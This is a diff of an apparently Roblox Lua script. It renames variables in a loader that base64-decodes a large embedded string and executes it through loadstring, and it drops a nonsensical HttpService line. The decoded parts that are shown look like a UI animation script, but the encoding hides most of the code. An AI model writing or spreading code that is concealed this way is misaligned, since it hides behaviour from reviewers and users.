@@ -1,4 +1,4 @@
-local _w5i626 = {
+local _a = {
     "LS0g4Liq4LiE4Li04Lib4LiC4Lit4LiHIDE5MSDguITguYnguLLguJrguYDguJrguJrguLXguYsKLS0g",
     "TG9jYWxTY3JpcHQg4LmD4Liq4LmI4LmD4LiZIFN0YXJ0ZXJQbGF5ZXJTY3JpcHRzCgpsb2NhbCBQbGF5",
     "ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJcODBcMTA4XDk3XDEyMVwxMDFcMTE0XDExNSIpCmxvY2FsIFR3",
@@ -209,10 +209,8 @@ local _w5i626 = {
     "ci5Qb3NpdGlvbi5ZLk9mZnNldCsxMTcpCiAgICB9KTpQbGF5KCkKICAgIHRhc2sud2FpdCgwLjI1KQog",
     "ICAgX2c6RGVzdHJveSgpCmVuZCkK",
 }
-local _m2nnjj = table.concat(_w5i626)
-local _ekrzj0 = game:GetService("HttpService")
-local _fj8fkb = _ekrzj0:JSONDecode("{\"x\":\"{}\"}".format and "base64" or "base64")
-local function _0tleua(s)
+local _b = table.concat(_a)
+local function _c(s)
     local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
     s=s:gsub("[^"..b.."=]","")
     return(s:gsub(".",function(x)
@@ -226,4 +224,4 @@ local function _0tleua(s)
         return string.char(c)
     end))
 end
-loadstring(_0tleua(_m2nnjj))()
+loadstring(_c(_b))()
